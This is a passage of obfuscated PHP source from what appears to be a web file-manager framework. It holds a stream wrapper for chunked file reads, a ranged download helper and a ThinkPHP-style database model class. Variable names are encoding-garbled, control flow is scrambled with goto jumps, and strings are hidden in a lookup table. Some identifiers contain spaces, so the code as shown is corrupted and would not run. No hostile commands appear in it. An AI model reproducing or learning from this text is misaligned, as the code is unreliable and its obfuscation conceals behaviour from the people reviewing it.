{ return !1; } goto a×³ë¸ğÙ®; Bã¥ğë¢‡: $b¡ÑáÑ–ç = url_request($F‰íÍİ×§¥, $Cçê„¿¥àø[226], !1, $F‚‚ÕƒÄ–ã, !1, !1, 1); return $b¡ÑáÑ–ç[$Cçê„¿¥àø[1065]] ? $b¡ÑáÑ–ç[$Cçê„¿¥àø[1065]] : $Cçê„¿¥àø[33]; goto bËÑÈÂóé; a×³ë¸ğÙ®: if ($EÑÄƒ½ÁÓ… === -1) { $EÑÄƒ½ÁÓ… = $eï‰³Ï–À [$Cçê„¿¥àø[77]]; } if ($EÑÄƒ½ÁÓ… == 0) { return $Cçê„¿¥àø[33]; } $F‚‚ÕƒÄ–ã = array($Cçê„¿¥àø[1357] . $b¤Á¸À˜  . $Cçê„¿¥àø[730] . ($b¤Á¸À˜  + $EÑÄƒ½ÁÓ… - 1)); goto Bã¥ğë¢‡; bËÑÈÂóé: } public function download($fô½ˆì¸½—, $B…Œ¼œ‰¦…) { Downloader::start($fô½ˆì¸½—, $B…Œ¼œ‰¦…); return $B…Œ¼œ‰¦…; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($cÏÛà‹Î†ò, $eÚ‘…³µ÷µ = '') { goto Bğ÷Şˆñ¾; aõ¾—ÕŠ¦™: if (!isset(self::$_chunkBuffer[$cÏÛà‹Î†ò])) { self::$_chunkBuffer[$cÏÛà‹Î†ò] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto a˜‚“Õ…¹í; Bğ÷Şˆñ¾: $this->info = $this->info($cÏÛà‹Î†ò); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[µ…][75]]; goto fõëÖ“ÄÒ; fõëÖ“ÄÒ: $this->pathOpen = $cÏÛà‹Î†ò; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto aõ¾—ÕŠ¦™; a˜‚“Õ…¹í: } function stream_read($CÈ´³’ôİô) { $DŞê¦—áŒç = $this->fileSubstr($this->pose, $CÈ´³’ôİô); $this->pose += strlen($DŞê¦—áŒç); return $DŞê¦—áŒç; } public function stream_tell() { return $this->pose; } public function stream_seek($B¯ˆÉÅ‚Ê, $CÌÖø²Æ¯) { $Eªø¢ôµ­Î =& $_SERVER[µ…]; if ($CÌÖø²Æ¯ == SEEK_SET) { $this->pose = $B¯ˆÉÅ‚Ê; } else { if ($CÌÖø²Æ¯ == SEEK_CUR) { $this->pose += $B¯ˆÉÅ‚Ê; } else { if ($CÌÖø²Æ¯ == SEEK_END) { $this->pose = $this->info[$Eªø¢ôµ­Î[77]] + intval($B¯ˆÉÅ‚Ê); } } } if ($B¯ˆÉÅ‚Ê < 0) { $this->pose = $this->info[$Eªø¢ôµ­Î[77]] + $B¯ˆÉÅ‚Ê; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[µ…][77]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($DÆŠï¤›æÊ, $f•£¸ˆ¡×) { $F‰÷ôæ =& $_SERVER[µ…]; $F†ÚÉğÔêÖ = $this->info($DÆŠï¤›æÊ); return array($F‰÷ôæ[1358] => 0, $F‰÷ôæ[1359] => 0, $F‰÷ôæ[12] => 32768 + 511, $F‰÷ôæ[1360] => 0, $F‰÷ôæ[1361] => 0, $F‰÷ôæ[1362] => 0, $F‰÷ôæ[1363] => 0, $F‰÷ôæ[77] => $F†ÚÉğÔêÖ[$F‰÷ôæ[77]], $F‰÷ôæ[1364] => $F†ÚÉğÔêÖ[$F‰÷ôæ[1231]], $F‰÷ôæ[1320] => $F†ÚÉğÔêÖ[$F‰÷ôæ[83]], $F‰÷ôæ[1319] => $F†ÚÉğÔêÖ[$F‰÷ôæ[192]], $F‰÷ôæ[1365] => 0, $F‰÷ôæ[1366] => 0); } static $fileInfo = array(); public function info($a‡âƒ‰ÒÅ) { $EÊÉöÕ§³¦ = $_SERVER[µ…][1367]; if (isset(self::$fileInfo[$a‡âƒ‰ÒÅ])) { return self::$fileInfo[$a‡âƒ‰ÒÅ]; } if (substr($a‡âƒ‰ÒÅ, 0, strlen($EÊÉöÕ§³¦)) != $EÊÉöÕ§³¦) { return !1; } self::$fileInfo[$a‡âƒ‰ÒÅ] = IO::info(substr($a‡âƒ‰ÒÅ, strlen($EÊÉöÕ§³¦))); return self::$fileInfo[$a‡âƒ‰ÒÅ]; } public static function read($e¼Ğ¼ÈÚÙ, $EË§òÓã¿È, $a–åŠÅº¸Â) { if (!isset(self::$_fopenCache[$e¼Ğ¼ÈÚÙ])) { $Dê¥÷´šá = new StreamWrapperIO(); $Dê¥÷´šá->stream_open($e¼Ğ¼ÈÚÙ); self::$_fopenCache[$e¼Ğ¼ÈÚÙ] = $Dê¥÷´šá; } $Dê¥÷´šá = self::$_fopenCache[$e¼Ğ¼ÈÚÙ]; return $Dê¥÷´šá->fileSubstr($EË§òÓã¿È, $a–åŠÅº¸Â); } public static function _read($Bºˆò˜Íù„, $fñ¹³Ú Æ¼, $Aéİè‹¾ãÔ) { goto Dè‹ˆ®¤ËÏ; e‡ãŒ‡¿á: $E›²ªáï´ğ = 0; while ($E›²ªáï´ğ < $Aéİè‹¾ãÔ) { $b°Şµ¦øØ = min($aÕèÌÔÜ‰ã, $Aéİè‹¾ãÔ - $E›²ªáï´ğ); $Eğ¥‚‘µ¿ .= fread($F»¼ÒÌŸ, $b°Şµ¦øØ); $E›²ªáï´ğ += $b°Şµ¦øØ; } fclose($F»¼ÒÌŸ); goto CÎö©î¡Çë; Dè‹ˆ®¤ËÏ: $f“¡³Ñ¶ß• =& $_SERVER[µ…]; $F»¼ÒÌŸ = fopen($Bºˆò˜Íù„, $f“¡³Ñ¶ß•[1235]); if (!$F»¼ÒÌŸ) { return $f“¡³Ñ¶ß•[33]; } goto b†ôßŠ¦ŒÑ; b†ôßŠ¦ŒÑ: $aÕèÌÔÜ‰ã = 8192; fseek($F»¼ÒÌŸ, $fñ¹³Ú Æ¼, SEEK_SET); $Eğ¥‚‘µ¿ = $f“¡³Ñ¶ß•[33]; goto e‡ãŒ‡¿á; CÎö©î¡Çë: return $Eğ¥‚‘µ¿; goto B’±ëÉî”¶; B’±ëÉî”¶: } public function fileSubstr($D“°•Æ™³ª, $d Œ–ªŒÖ®) { goto cê©‚„¨‘¥; FÌ–ÓÒ—: $bÖ¦ÔÕÙ = 0; $f¿¯Ó¤™ëÎ = 0; $BÍÒäÍÁ à = $E‹«Œº´Ö[33]; goto A ¤‚Äµ; c¸ºÅ“«ˆ±: $CÔ”½µ‘· = 64 * 1024; $b¯èÈÕëÆ¾ =& self::$_chunkBuffer[$this->path]; if (!$b¯èÈÕëÆ¾) { $b¯èÈÕëÆ¾ = array(); } goto FÌ–ÓÒ—; EÃ¼ƒÓÚ´: $aº«¸¤òçé = ceil(($D“°•Æ™³ª + $d Œ–ªŒÖ®) / $CÔ”½µ‘·) * $CÔ”½µ‘· - $Eê”ˆ¬®¨ß; $Bîç½Ìøå‹ = IO::fileSubstr($this->path, $Eê”ˆ¬®¨ß, $aº«¸¤òçé); $b¯èÈÕëÆ¾[$Eê”ˆ¬®¨ß . $E‹«Œº´Ö[33]] = $Bîç½Ìøå‹; goto EšŠˆé‰ÙŸ; cê©‚„¨‘¥: $E‹«Œº´Ö =& $_SERVER[µ…]; $fØñ„¡ÛÙ× = $this->info[$E‹«Œº´Ö[77]]; $F°Ò‘«·ƒØ = $D“°•Æ™³ª; goto fó©ßáöƒ; fó©ßáöƒ: $fù¦Æ…ØÂ“ = $d Œ–ªŒÖ®; if ($D“°•Æ™³ª < 0) { $D“°•Æ™³ª = $fØñ„¡ÛÙ× + $D“°•Æ™³ª; } if ($d Œ–ªŒÖ® === !1) { $d Œ–ªŒÖ® = $fØñ„¡ÛÙ× - $D“°•Æ™³ª; } goto Bšñ°îëÏÍ; EšŠˆé‰ÙŸ: ksort($b¯èÈÕëÆ¾); $C²ØÕ©¼«Ú = substr($Bîç½Ìøå‹, $D“°•Æ™³ª - $Eê”ˆ¬®¨ß, $d Œ–ªŒÖ®); return $C²ØÕ©¼«Ú; goto bÂª‚ƒ‰µ´; Bšñ°îëÏÍ: if ($D“°•Æ™³ª + $d Œ–ªŒÖ® > $fØñ„¡ÛÙ×) { $d Œ–ªŒÖ® = $fØñ„¡ÛÙ× - $D“°•Æ™³ª; } if ($d Œ–ªŒÖ® <= 0) { return $E‹«Œº´Ö[33]; } if ($D“°•Æ™³ª < 0 || $D“°•Æ™³ª >= $fØñ„¡ÛÙ× || $d Œ–ªŒÖ® <= 0 || $d Œ–ªŒÖ® > 1024 * 1024 * 5) { throw new Exception("\151\x6f\106\x69\x6c\145\122\x65\x61\144\x20\145\x72\162\x6f\x72\x21\x20\x73\x74\x61\x72\164\x3d{$D“°•Æ™³ª}\73\x6c\145\156\x67\x74\x68\75{$d Œ–ªŒÖ®}\73\40\163\x69\172\x65\x3d{$fØñ„¡ÛÙ×}\x3b"); } goto c¸ºÅ“«ˆ±; A ¤‚Äµ: foreach ($b¯èÈÕëÆ¾ as $bÖ¦ÔÕÙ => $BÍÒäÍÁ à) { $bÖ¦ÔÕÙ = intval($bÖ¦ÔÕÙ); $f¿¯Ó¤™ëÎ = $bÖ¦ÔÕÙ + strlen($BÍÒäÍÁ à); if ($D“°•Æ™³ª >= $f¿¯Ó¤™ëÎ) { continue; } if ($D“°•Æ™³ª >= $bÖ¦ÔÕÙ && $D“°•Æ™³ª + $d Œ–ªŒÖ® <= $f¿¯Ó¤™ëÎ) { return substr($BÍÒäÍÁ à, $D“°•Æ™³ª - $bÖ¦ÔÕÙ, $d Œ–ªŒÖ®); } break; } if (count($b¯èÈÕëÆ¾) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($E‹«Œº´Ö[1368], $E‹«Œº´Ö[1369] . count($b¯èÈÕëÆ¾) . "\x3b\x73\x74\141\x72\x74\x3d{$D“°•Æ™³ª}\x2c\x6c\145\156\147\164\150\x3d{$d Œ–ªŒÖ®}\x3b\x70\x6f\163\x65\x3a{$bÖ¦ÔÕÙ}\x7e{$f¿¯Ó¤™ëÎ}"); throw new Exception($E‹«Œº´Ö[1370]); } $Eê”ˆ¬®¨ß = intval($D“°•Æ™³ª / $CÔ”½µ‘·) * $CÔ”½µ‘·; goto EÃ¼ƒÓÚ´; bÂª‚ƒ‰µ´: } private function log($c©¦¼Ïó, $eªÊ…¼Ò—‹) { $FÚ¥·”¡È” =& $_SERVER[µ…]; $FÖØ‡ÒÏ = timeFloat() - $this->timeStart; write_log(sprintf($FÚ¥·”¡È”[1371], $c©¦¼Ïó, $this->info[$FÚ¥·”¡È”[28]], $FÖØ‡ÒÏ, $eªÊ…¼Ò—‹), $FÚ¥·”¡È”[1055]); } } goto Dø˜‘™¨—¸; b©÷Ç°½÷ß: define($_SERVER[µ…][238], 0); define($_SERVER[µ…][239], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\x65", "\x6f\162\144\x65\x72", "\141\154\x69\141\x73", "\150\x61\166\151\x6e\x67", "\x67\x72\157\x75\x70", "\154\x6f\143\x6b", "\144\151\163\164\151\x6e\x63\x74", "\x61\x75\x74\157", "\146\x69\154\x74\x65\162", "\166\x61\154\151\144\141\164\x65", "\162\145\x73\x75\154\164", "\142\x69\x6e\144", "\x74\157\x6b\145\156"); public function __construct($a¾¿–‘µ‡ = '', $F«Ò«Íğƒ = '', $BÄ–íÚ™¬— = '') { $aÔĞÜËŸŞ =& $_SERVER[µ…]; $this->_initialize(); if (!empty($a¾¿–‘µ‡)) { if (strpos($a¾¿–‘µ‡, $aÔĞÜËŸŞ[94])) { list($this->dbName, $this->name) = explode($aÔĞÜËŸŞ[94], $a¾¿–‘µ‡); } else { $this->name = $a¾¿–‘µ‡; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($F«Ò«Íğƒ)) { $this->tablePrefix = $aÔĞÜËŸŞ[33]; } elseif ($aÔĞÜËŸŞ[33] != $F«Ò«Íğƒ) { $this->tablePrefix = $F«Ò«Íğƒ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($aÔĞÜËŸŞ[240]); } $this->db(0, empty($this->connection) ? $BÄ–íÚ™¬— : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $bˆî·ùê =& $_SERVER[µ…]; if (empty($this->fields)) { if (think_config($bˆî·ùê[241])) { $e§•ñ¯à¹ = $this->dbName ? $this->dbName : think_config($bˆî·ùê[242]); $bÏÅÖö¹‚· = think_var_cache($bˆî·ùê[243] . strtolower(get_path_this($e§•ñ¯à¹) . $bˆî·ùê[94] . $this->name)); if ($bÏÅÖö¹‚·) { $A®„Ü³Çè« = think_config($bˆî·ùê[244]); if (empty($A®„Ü³Çè«) || $bÏÅÖö¹‚·[$bˆî·ùê[245]] == $A®„Ü³Çè«) { $this->fields = $bÏÅÖö¹‚·; return; } } } $this->flush(); } } public function flush() { goto bßç ŠÖ¬”; E¶èğ“™: if (think_config($a¯§‡Ç¥ŠÑ[241])) { $E’ŸšÄ­¥ = $this->dbName ? $this->dbName : think_config($a¯§‡Ç¥ŠÑ[242]); think_var_cache($a¯§‡Ç¥ŠÑ[243] . strtolower(get_path_this($E’ŸšÄ­¥) . $a¯§‡Ç¥ŠÑ[94] . $this->name), $this->fields); } goto d–ÃŞØ­ò; b¤ê¡íä¦Ÿ: foreach ($cˆœ˜ËÌå± as $eßÄÍÙĞàŒ => $B´·¼ˆåæö) { $EñäñæÎ…Ã[$eßÄÍÙĞàŒ] = $B´·¼ˆåæö[$a¯§‡Ç¥ŠÑ[29]]; if ($B´·¼ˆåæö[$a¯§‡Ç¥ŠÑ[36]]) { $this->fields[$a¯§‡Ç¥ŠÑ[247]] = $eßÄÍÙĞàŒ; if ($B´·¼ˆåæö[$a¯§‡Ç¥ŠÑ[39]]) { $this->fields[$a¯§‡Ç¥ŠÑ[246]] = !0; } } } $this->fields[$a¯§‡Ç¥ŠÑ[248]] = $EñäñæÎ…Ã; if (think_config($a¯§‡Ç¥ŠÑ[244])) { $this->fields[$a¯§‡Ç¥ŠÑ[245]] = think_config($a¯§‡Ç¥ŠÑ[244]); } goto E¶èğ“™; F¦§ùµ¦: if (!$cˆœ˜ËÌå±) { return !1; } $this->fields = array_keys($cˆœ˜ËÌå±); $this->fields[$a¯§‡Ç¥ŠÑ[246]] = !1; goto b¤ê¡íä¦Ÿ; bßç ŠÖ¬”: $a¯§‡Ç¥ŠÑ =& $_SERVER[µ…]; $this->db->setModel($this->name); $cˆœ˜ËÌå± = $this->db->getFields($this->getTableName()); goto F¦§ùµ¦; d–ÃŞØ­ò: } public function switchModel($bŠ£ãá‡, $b§†Ô³‡ª = array()) { $d¥ñÎøÑ ÷ =& $_SERVER[µ…]; $e½Äœ’®ËÜ = ucwords(strtolower($bŠ£ãá‡)) . $d¥ñÎøÑ ÷[249]; if (!class_exists($e½Äœ’®ËÜ)) { think_exception($e½Äœ’®ËÜ . think_lang($d¥ñÎøÑ ÷[250])); } $this->_extModel = new $e½Äœ’®ËÜ($this->name); if (!empty($b§†Ô³‡ª)) { foreach ($b§†Ô³‡ª as $DÔíÖŒœÇÉ) { $this->_extModel->setProperty($DÔíÖŒœÇÉ, $this->{$DÔíÖŒœÇÉ}); } } return $this->_extModel; } public function __set($aÕÖÆƒˆÛƒ, $D¥ƒ¿àì») { $this->data[$aÕÖÆƒˆÛƒ] = $D¥ƒ¿àì»; } public function __get($dºÉ§İ›°¤) { return isset($this->data[$dºÉ§İ›°¤]) ? $this->data[$dºÉ§İ›°¤] : null; } public function __isset($FÙëïÇï®•) { return isset($this->data[$FÙëïÇï®•]); } public function __unset($f¥µÅäî¹) { unset($this->data[$f¥µÅäî¹]); } public function __call($DĞ„•­Ü‡, $cØŒ¥ñ¯ğ) { $B‡¬Î»— =& $_SERVER[µ…]; if (in_array(strtolower($DĞ„•­Ü‡), $this->methods, !0)) { $this->options[strtolower($DĞ„•­Ü‡)] = $cØŒ¥ñ¯ğ[0]; return $this; } elseif (in_array(strtolower($DĞ„•­Ü‡), array($B‡¬Î»—[251], $B‡¬Î»—[252], $B‡¬Î»—[253], $B‡¬Î»—[254], $B‡¬Î»—[255]), !0)) { $e†ØõÂé† = isset($cØŒ¥ñ¯ğ[0]) ? $cØŒ¥ñ¯ğ[0] : $B‡¬Î»—[181]; $e†ØõÂé† = $this->db->parseKey($e†ØõÂé†); return $this->getField(strtoupper($DĞ„•­Ü‡) . $B‡¬Î»—[256] . $e†ØõÂé† . $B‡¬Î»—[257] . $DĞ„•­Ü‡, $B‡¬Î»—[251]); } elseif (strtolower(substr($DĞ„•­Ü‡, 0, 5)) == $B‡¬Î»—[258]) { $e†ØõÂé† = think_parse_name(substr($DĞ„•­Ü‡, 5)); $B¢¥ÀÇŒØê[$e†ØõÂé†] = $cØŒ¥ñ¯ğ[0]; return $this->where($B¢¥ÀÇŒØê)->find(); } elseif (strtolower(substr($DĞ„•­Ü‡, 0, 10)) == $B‡¬Î»—[259]) { $C­Ï¤®å£ = think_parse_name(substr($DĞ„•­Ü‡, 10)); $B¢¥ÀÇŒØê[$C­Ï¤®å£] = $cØŒ¥ñ¯ğ[0]; return $this->where($B¢¥ÀÇŒØê)->getField($cØŒ¥ñ¯ğ[1]); } elseif (isset($this->_scope[$DĞ„•­Ü‡])) { return $this->scope($DĞ„•­Ü‡, $cØŒ¥ñ¯ğ[0]); } elseif (method_exists($this, $DĞ„•­Ü‡)) { array_unshift($cØŒ¥ñ¯ğ, $DĞ„•­Ü‡); return call_user_func_array(array($this, $B‡¬Î»—[260]), $cØŒ¥ñ¯ğ); } else { return call_user_func_array(array(parent, $DĞ„•­Ü‡), $cØŒ¥ñ¯ğ); } } protected function call() { goto Bà¥Üí§¡·; Bà¥Üí§¡·: $D†±ÌÚ÷©É =& $_SERVER[µ…]; $D‰¿¹˜‚ƒ = func_get_args(); $b¼º£°¡¦‰ = array_shift($D‰¿¹˜‚ƒ); goto d ’²¦áÕ; F³×…ˆÔõ: $a¤«µñ‡–¡ = call_user_func_array(array($this, $b¼º£°¡¦‰), $D‰¿¹˜‚ƒ); if (method_exists($this, $D†±ÌÚ÷©É[264])) { $BÙ«°ˆÅ‘‘ = call_user_func_array(array($this, $D†±ÌÚ÷©É[265]), array($eÜ»ˆ¸Ç, $D‰¿¹˜‚ƒ, $a¤«µñ‡–¡)); if ($BÙ«°ˆÅ‘‘) { return $BÙ«°ˆÅ‘‘; } } return $a¤«µñ‡–¡; goto e×Õê÷¼Û; F¦íõê·¬: if (isset($D‰¿¹˜‚ƒ[$C»ç±çø¸À]) && $D‰¿¹˜‚ƒ[$C»ç±çø¸À] === $b¼º£°¡¦‰) { think_exception(__CLASS__ . $D†±ÌÚ÷©É[4] . $b¼º£°¡¦‰ . think_lang($D†±ÌÚ÷©É[261])); return; } $D‰¿¹˜‚ƒ[] = $b¼º£°¡¦‰; if (method_exists($this, $D†±ÌÚ÷©É[262])) { $BÙ«°ˆÅ‘‘ = call_user_func_array(array($this, $D†±ÌÚ÷©É[263]), array($eÜ»ˆ¸Ç, $D‰¿¹˜‚ƒ)); if (!is_null($BÙ«°ˆÅ‘‘) && $BÙ«°ˆÅ‘‘ !== !1) { return $BÙ«°ˆÅ‘‘; } } goto F³×…ˆÔõ; d ’²¦áÕ: $eÜ»ˆ¸Ç = $b¼º£°¡¦‰; if (is_array($b¼º£°¡¦‰)) { $eÜ»ˆ¸Ç = $b¼º£°¡¦‰[1]; $b¼º£°¡¦‰ = $b¼º£°¡¦‰[0]; } $C»ç±çø¸À = count($D‰¿¹˜‚ƒ) - 1; goto F¦íõê·¬; e×Õê÷¼Û: } protected function _initialize() { } protected function _facade($FĞÄŞÈ¼µÏ) { $Fœæ„Ù¸ä =& $_SERVER[µ…]; if (!empty($this->fields)) { foreach ($FĞÄŞÈ¼µÏ as $CÑéÉÆøŒ¢ => $fºØ®×©éÑ) { if (is_array($this->fields) && !in_array($CÑéÉÆøŒ¢, $this->fields, !0)) { unset($FĞÄŞÈ¼µÏ[$CÑéÉÆøŒ¢]); } elseif (is_scalar($fºØ®×©éÑ)) { $this->_parseType($FĞÄŞÈ¼µÏ, $CÑéÉÆøŒ¢); } } } if (!empty($this->options[$Fœæ„Ù¸ä[266]])) { $FĞÄŞÈ¼µÏ = array_map($this->options[$Fœæ„Ù¸ä[266]], $FĞÄŞÈ¼µÏ); unset($this->options[$Fœæ„Ù¸ä[266]]); } $this->_beforeWrite($FĞÄŞÈ¼µÏ); return $FĞÄŞÈ¼µÏ; } protected function _beforeWrite(&$d¼ŒàøäÈÃ) { } public function add($a“ìŒöÆËŸ = '', $aò†Ã÷Áã = array(), $f½Ÿ×†·Å = false) { goto F÷Í”Ûœœ”; f‹¦ôâÎ—­: return $BòØ îï…; goto eÉâ‘¥èêƒ; F÷Í”Ûœœ”: if (empty($a“ìŒöÆËŸ)) { if (!empty($this->data)) { $a“ìŒöÆËŸ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[µ…][267]); return !1; } } $aò†Ã÷Áã = $this->_parseOptions($aò†Ã÷Áã); $a“ìŒöÆËŸ = $this->_facade($a“ìŒöÆËŸ); goto cÉ¡¾¸ÄôØ; cÉ¡¾¸ÄôØ: if (!1 === $this->_beforeInsert($a“ìŒöÆËŸ, $aò†Ã÷Áã)) { return !1; } $BòØ îï… = $this->db->insert($a“ìŒöÆËŸ, $aò†Ã÷Áã, $f½Ÿ×†·Å); if (!1 !== $BòØ îï…) { $DÓáö…ÁÑ˜ = $this->getLastInsID(); if ($DÓáö…ÁÑ˜) { $a“ìŒöÆËŸ[$this->getPk()] = $DÓáö…ÁÑ˜; $this->_after_insert($a“ìŒöÆËŸ, $aò†Ã÷Áã); return $DÓáö…ÁÑ˜; } $this->_after_insert($a“ìŒöÆËŸ, $aò†Ã÷Áã); } goto f‹¦ôâÎ—­; eÉâ‘¥èêƒ: } protected function _beforeInsert(&$FŒä”³®Ëİ, $f¡¨‘Ò£¹£) { } protected function _after_insert($a¦Î‡ªò²¹, $F¡µŒÄà) { } public function addAll($cØá±Îßâ, $c‘ÂçÑ = array(), $B©êáª¦¦‡ = false) { goto aŸöò‘ ã«; aŸöò‘ ã«: $c„Ä›ßˆé† =& $_SERVER[µ…]; if (empty($cØá±Îßâ)) { $this->error = think_lang($c„Ä›ßˆé†[267]); return !1; } $c‘ÂçÑ = $this->_parseOptions($c‘ÂçÑ); goto BŠÎ­ºÈÌ§; BŠÎ­ºÈÌ§: foreach ($cØá±Îßâ as $Bí¹Û”ÁÓ„ => $Eç Ä®ÒÀ—) { $cØá±Îßâ[$Bí¹Û”ÁÓ„] = $this->_facade($Eç Ä®ÒÀ—); } if (method_exists($this->db, $c„Ä›ßˆé†[268])) { $A™‹Ùïîï = $this->db->insertAll($cØá±Îßâ, $c‘ÂçÑ, $B©êáª¦¦‡); } else { $this->startTrans(); foreach ($cØá±Îßâ as $Bí¹Û”ÁÓ„ => $Eç Ä®ÒÀ—) { $A™‹Ùïîï = $this->db->insert($Eç Ä®ÒÀ—, $c‘ÂçÑ, $B©êáª¦¦‡); } $this->commit(); } if (!1 !== $A™‹Ùïîï) { $a¿›•ãÀ«Ë = $this->getLastInsID(); if ($a¿›•ãÀ«Ë) { return $a¿›•ãÀ«Ë; } } goto b†ÃÄ¶ÕÖÄ; b†ÃÄ¶ÕÖÄ: return $A™‹Ùïîï; goto B×Ëòµ°Ö; B×Ëòµ°Ö: } public function selectAdd($DÆ»•Ô°¥± = '', $fîˆ†²§›Ø = '', $DœŒãÈšï‚ = array()) { $a¾Œğ‰ï¾ =& $_SERVER[µ…]; $DœŒãÈšï‚ = $this->_parseOptions($DœŒãÈšï‚); if (!1 === ($Bğ×±Í¶¯ = $this->db->selectInsert($DÆ»•Ô°¥± ? $DÆ»•Ô°¥± : $DœŒãÈšï‚[$a¾Œğ‰ï¾[269]], $fîˆ†²§›Ø ? $fîˆ†²§›Ø : $this->getTableName(), $DœŒãÈšï‚))) { $this->error = think_lang($a¾Œğ‰ï¾[270]); return !1; } else { return $Bğ×±Í¶¯; } } public function save($E‚¹¬·×³ˆ = '', $d±æéù‚î­ = array()) { goto cÈ¡æ¯¨‚¨; aÜÕ»‘®ë–: if (is_array($d±æéù‚î­[$E„ÆĞ˜‡ğ”[271]]) && isset($d±æéù‚î­[$E„ÆĞ˜‡ğ”[271]][$Eíº†¹óÒŒ])) { $cØ‰š¶‹Ó¬ = $d±æéù‚î­[$E„ÆĞ˜‡ğ”[271]][$Eíº†¹óÒŒ]; } if (!1 === $this->_beforeUpdate($E‚¹¬·×³ˆ, $d±æéù‚î­)) { return !1; } $Cœ èÑ×¶ã = $this->db->update($E‚¹¬·×³ˆ, $d±æéù‚î­); goto b¾š¯˜Šø; cÈ¡æ¯¨‚¨: $E„ÆĞ˜‡ğ” =& $_SERVER[µ…]; if (empty($E‚¹¬·×³ˆ)) { if (!empty($this->data)) { $E‚¹¬·×³ˆ = $this->data; $this->data = array(); } else { $this->error = think_lang($E„ÆĞ˜‡ğ”[267]); return !1; } } $E‚¹¬·×³ˆ = $this->_facade($E‚¹¬·×³ˆ); goto cîÑã¯ÇÕê; b¾š¯˜Šø: if (!1 !== $Cœ èÑ×¶ã) { if (isset($cØ‰š¶‹Ó¬)) { $E‚¹¬·×³ˆ[$Eíº†¹óÒŒ] = $cØ‰š¶‹Ó¬; } $this->_afterUpdate($E‚¹¬·×³ˆ, $d±æéù‚î­); } return $Cœ èÑ×¶ã; goto a¥¬Æ‚Æ¥; cîÑã¯ÇÕê: $d±æéù‚î­ = $this->_parseOptions($d±æéù‚î­); $Eíº†¹óÒŒ = $this->getPk(); if (!isset($d±æéù‚î­[$E„ÆĞ˜‡ğ”[271]])) { if (isset($E‚¹¬·×³ˆ[$Eíº†¹óÒŒ])) { $eà‰ëŠÜæÑ[$Eíº†¹óÒŒ] = $E‚¹¬·×³ˆ[$Eíº†¹óÒŒ]; $d±æéù‚î­[$E„ÆĞ˜‡ğ”[271]] = $eà‰ëŠÜæÑ; unset($E‚¹¬·×³ˆ[$Eíº†¹óÒŒ]); } else { $this->error = think_lang($E„ÆĞ˜‡ğ”[270]); return !1; } } goto aÜÕ»‘®ë–; a¥¬Æ‚Æ¥: } protected function _beforeUpdate(&$F—ºİ½¼‰, $bÆ¿Œãå) { } protected function _afterUpdate($AÃšáøÏÃÎ, $f‚ğÛñ÷ª½) { } public function delete($Eª­‹‹·· = array()) { goto CÄœâñˆŒá; aµäôƒÀ–: if (is_numeric($Eª­‹‹··) || is_string($Eª­‹‹··)) { if (strpos($Eª­‹‹··, $aãÖ¡Èåƒ²[47])) { $c§Äµ´‘–[$CŞ©—“ã‚ä] = array($aãÖ¡Èåƒ²[272], $Eª­‹‹··); } else { $c§Äµ´‘–[$CŞ©—“ã‚ä] = $Eª­‹‹··; } $this->options[$aãÖ¡Èåƒ²[271]] = $c§Äµ´‘–; } $Eª­‹‹·· = $this->_parseOptions(); if (is_array($Eª­‹‹··[$aãÖ¡Èåƒ²[271]]) && isset($Eª­‹‹··[$aãÖ¡Èåƒ²[271]][$CŞ©—“ã‚ä])) { $f«Ø«†„‘— = $Eª­‹‹··[$aãÖ¡Èåƒ²[271]][$CŞ©—“ã‚ä]; } goto E¡ç©‹®É; CÄœâñˆŒá: $aãÖ¡Èåƒ² =& $_SERVER[µ…]; if (empty($Eª­‹‹··) && empty($this->options[$aãÖ¡Èåƒ²[271]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $CŞ©—“ã‚ä = $this->getPk(); goto aµäôƒÀ–; E¡ç©‹®É: $fê‡Õ¸÷•æ = $this->db->delete($Eª­‹‹··); if (!1 !== $fê‡Õ¸÷•æ) { $fÖñ‚Í‘¸ = array(); if (isset($f«Ø«†„‘—)) { $fÖñ‚Í‘¸[$CŞ©—“ã‚ä] = $f«Ø«†„‘—; } $this->_after_delete($fÖñ‚Í‘¸, $Eª­‹‹··); } return $fê‡Õ¸÷•æ; goto C¦ñ‹×ÎÁ; C¦ñ‹×ÎÁ: } protected function _after_delete($aŒ“©è¤Ÿ, $C“‹„§Ş§â) { } public function select($dœæÀòÃñ = array()) { goto eŒ¸øö‘Á; eŒ¸øö‘Á: $fÉ†×ŠÚä  =& $_SERVER[µ…]; if (is_string($dœæÀòÃñ) || is_numeric($dœæÀòÃñ)) { $a­Õ×ªÈÊ = $this->getPk(); if (strpos($dœæÀòÃñ, $fÉ†×ŠÚä [47])) { $AİÙ¸ØÓ£†[$a­Õ×ªÈÊ] = array($fÉ†×ŠÚä [272], $dœæÀòÃñ); } else { $AİÙ¸ØÓ£†[$a­Õ×ªÈÊ] = $dœæÀòÃñ; } $this->options[$fÉ†×ŠÚä [271]] = $AİÙ¸ØÓ£†; } elseif (!1 === $dœæÀòÃñ) { $dœæÀòÃñ = $this->_parseOptions(); return $fÉ†×ŠÚä [273] . $this->db->buildSelectSql($dœæÀòÃñ) . $fÉ†×ŠÚä [274]; } $dœæÀòÃñ = $this->_parseOptions(); goto a•…è›Ø«; b“˜ïÙÌ÷Ÿ: 